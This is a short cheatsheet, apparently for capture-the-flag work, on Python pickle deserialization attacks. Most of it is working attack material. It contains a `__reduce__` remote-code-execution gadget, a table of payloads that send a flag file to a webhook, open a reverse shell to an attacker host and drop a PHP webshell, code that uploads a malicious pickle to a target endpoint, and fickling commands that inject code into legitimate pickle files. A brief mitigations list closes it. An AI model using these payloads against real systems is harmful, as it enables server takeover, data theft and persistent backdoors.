# Cheatsheet — PKL Injection (Pickle Deserialization)

## What is it?

Python `pickle` is a serialisation format for saving and restoring objects.
During deserialisation, pickle invokes the object's `__reduce__` method, which
can return any callable together with its arguments — a built-in RCE primitive.
**Never deserialise data from untrusted sources.**

---

## Minimal gadget

```python
import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))   # replace "id" with your command

pickle.dump(RCE(), open("payload.pkl", "wb"))
```

---

## Execution variants

| Goal | Command inside __reduce__ |
|---|---|
| Exfiltrate flag via webhook | `f"curl -X POST URL --data-urlencode 'f=$(cat /flag.txt)'"` |
| Reverse shell | `"bash -i >& /dev/tcp/ATTACKER/4444 0>&1"` |
| Drop a webshell | `"echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php"` |
| Read flag to stdout | `"cat /flag.txt"` |

> For reverse shell / stdout capture: use `subprocess.check_output` instead of
> `os.system` to get the output back.

---

## In-memory generation (no temp file)

```python
import io, pickle, os, requests

class RCE:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt",))

buf = io.BytesIO()
pickle.dump(RCE(), buf)

requests.post("http://target/evaluate",
              files={"model": ("evil.pkl", buf.getvalue(), "application/octet-stream")})
```

---

## Quick vulnerability check

```bash
# Does the endpoint accept .pkl without content validation?
curl -s -X POST http://target/evaluate \
     -F "model=@evil_model.pkl" | grep -i "output\|error\|result"
```

---

## Useful tools

| Tool | Purpose |
|---|---|
| `fickling` | Static analysis and payload generation for pickle files |
| `pickletools.dis()` | Disassemble a .pkl opcode stream |
| `webhook.site` | Receive HTTP exfiltration |
| `ngrok` | Tunnel for reverse shells |

```bash
pip install fickling
fickling --check evil.pkl                       # analyse the pickle
fickling --inject 'os.system("id")' legit.pkl   # inject into existing pkl
```

---

## Mitigations (for developers)

- Use `joblib` with HMAC signature validation.
- Prefer safe formats: `ONNX`, `safetensors`, `JSON`.
- Never call `pickle.load()` on user-supplied data.
- Sandbox the evaluation process with `seccomp` / `gVisor`.
